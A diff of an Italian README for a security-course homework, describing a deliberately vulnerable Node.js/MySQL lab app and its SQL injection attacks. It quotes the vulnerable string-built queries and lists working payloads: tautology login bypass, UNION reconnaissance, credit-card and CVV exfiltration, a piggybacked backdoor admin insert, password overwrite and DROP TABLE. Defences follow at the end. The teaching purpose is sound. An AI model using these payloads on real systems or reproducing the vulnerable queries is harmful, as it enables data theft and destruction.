@@ -1,40 +1,99 @@
-# SQL-Injection
+# SQL Injection - Homework Sicurezza (Traccia 2)
 
-SQL Injection demo. Homework per esame di Sicurezza
+Web application volutamente vulnerabile per dimostrare un attacco di SQL Injection
+in-band, basato su input dell'utente, con tautologia, commento di fine riga e query
+piggybacked. L'attacco viola tutte e tre le proprietà CIA (Confidentiality, Integrity,
+Availability) di un database di cui all'inizio non si conosce la struttura.
 
-Realizzare un attacco di SQL injection di tipo inband (ovvero stesso canale utilizzato per l’injection della query malevola e per ricevere i risultati), basato su input dell’utente (ovvero l’attaccante inietta i comandi SQL fornendo un input opportunamente costruito) e che utilizzi una o più delle seguenti modalità: Tautologia, commento di fine riga; query piggybacked.
-Mediante l’injection di opportuni comandi mostrare che e’ sia possibile compromettere almeno due delle proprietà CIA.
-Suggerimenti:
+## Stack
 
-Supponete che il sistema da attaccare sia un server su cui e’ installato un DBMS, su cui risiede il database e su cui risiede l’applicazione web vulnerabile (ad esempio una pagina Php che genera query al DB).
-Il server può’ essere emulato mediante una macchina virtuale o un docker container.
-Scegliere versioni del software (OS, DB, Php, etc…) che siano vulnerabili ad attacchi SQLi.
+- Node.js 14 + Express come server web (la traccia suggeriva PHP, ma il difetto è lo
+  stesso: query costruite incollando stringhe)
+- MySQL 5.7, versione vecchia
+- Docker Compose per i due container (db e web)
+- driver `mysql` con `multipleStatements: true` per far funzionare il piggyback
 
-Questo progetto dimostra come un attacco di SQL Injection possa compromettere la sicurezza di un'applicazione web vulnerabile. Utilizza Node.js, Express e MySQL in un ambiente Docker.
+## Schema del database (`web/init.sql`)
 
-## Prerequisiti
+Tre tabelle:
 
-- Docker
-- Docker Compose
+- `users` (id, username, password, ruolo): login, password in chiaro
+- `carte_credito` (id, user_id, intestatario, numero, cvv, scadenza): il dato sensibile,
+  bersaglio dell'esfiltrazione
+- `ordini` (id, user_id, prodotto, importo): tabella in più da elencare
 
-## Configurazione dell'Ambiente
+L'attaccante vede solo il form: non sa che `carte_credito` esiste, deve scoprirlo da
+`information_schema`.
 
-1. Clonare il repository.
-2. Eseguire `docker-compose up` per avviare l'ambiente Docker.
+## Avvio
 
-## Esecuzione degli Attacchi SQL Injection
+```bash
+docker compose up -d --build      # avvia db + web
+# app su http://localhost:3000
+```
 
-1. Aprire la web app in localhost:3000.
-2. Applicare SQL-Injection tramite il form
+## Lanciare gli attacchi in automatico
 
-## Tipi di Attacchi Eseguiti
+```bash
+docker compose exec web node attack.js     # oppure: npm run attack
+```
 
-- **Tautologia**
-- **Commento di Fine Riga**
-- **Query Piggybacked**
-- **Unione (UNION)**
+`web/attack.js` fa le 10 fasi in ordine e stampa payload + risultato. L'output di una
+esecuzione reale è in [`risultati_sperimentali.txt`](risultati_sperimentali.txt).
 
+## Dove sta il difetto (`web/app.js`)
 
-## Misure di Sicurezza
+```js
+// POST /login  (riga 71)
+const query = `SELECT id, username FROM users WHERE username = '${username}' AND password = '${password}'`;
 
-Implementare query preparate e sanitizzare l'input dell'utente per prevenire SQL Injection.
+// GET /search/result  (riga 112)
+const query = `SELECT id, username, password FROM users WHERE username = '${user}'`;
+```
+
+Niente query parametrizzate, niente controllo: l'input entra dritto nella query.
+
+## I payload, in ordine
+
+Accesso (Confidentiality), nel campo username del login:
+
+- tautologia: `' OR '1'='1' -- `
+- commento di fine riga: `admin' -- `
+
+Ricognizione (non conosco lo schema), nel campo di ricerca:
+
+1. conto le colonne: `' ORDER BY 4 -- ` dà errore, `' ORDER BY 3 -- ` no, quindi 3 colonne
+2. versione/utente/db: `' UNION SELECT @@version, current_user(), database() -- `
+3. tabelle: `' UNION SELECT table_name, table_schema, 1 FROM information_schema.tables WHERE table_schema=database() -- ` (qui scopro `carte_credito`)
+4. colonne: `' UNION SELECT column_name, data_type, 1 FROM information_schema.columns WHERE table_name='carte_credito' -- `
+
+Esfiltrazione (Confidentiality):
+
+`' UNION SELECT numero, cvv, intestatario FROM carte_credito -- ` (numeri di carta e CVV in chiaro)
+
+Modifica (Integrity), piggyback sul login:
+
+- UPDATE: `x'; UPDATE users SET password='hacked123' WHERE username='admin'; -- `
+- INSERT backdoor: `x'; INSERT INTO users (username,password,ruolo) VALUES ('attacker','attackerpass','admin'); -- `
+
+Cancellazione (Availability), piggyback:
+
+`x'; DROP TABLE carte_credito; -- ` (la tabella sparisce, le ricerche dopo falliscono)
+
+## CIA
+
+- Confidentiality: tautologia, commento, UNION + information_schema -> login bypassato, carte lette
+- Integrity: piggyback UPDATE / INSERT -> password admin cambiata, utente backdoor
+- Availability: piggyback DROP TABLE -> tabella cancellata, servizio fuori uso
+
+## Come si difende (dettagli nella relazione, sez. 11)
+
+Query parametrizzate, `multipleStatements:false`, hash delle password (bcrypt), minimo
+privilegio sull'utente DB, controllo dell'input, niente `sqlMessage` rimandato al client,
+WAF davanti.
+
+## Reset
+
+```bash
+docker compose down -v     # al prossimo up ricrea il db pulito
+```
